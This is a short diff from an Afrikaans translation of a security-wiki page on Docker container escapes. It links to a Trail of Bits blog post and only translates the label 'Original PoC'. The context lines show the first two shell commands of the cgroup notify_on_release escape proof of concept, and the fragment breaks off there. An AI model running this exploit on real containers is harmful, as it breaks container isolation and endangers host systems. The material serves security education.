@@ -4,7 +4,7 @@
 
 **Vir verdere besonderhede, verwys na die** [**oorspronklike blogpos**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Dit is net 'n opsomming:
 
-Original PoC:
+Oorspronklike PoC:
 ```shell
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 mkdir -p $d/w;echo 1 >$d/w/notify_on_release
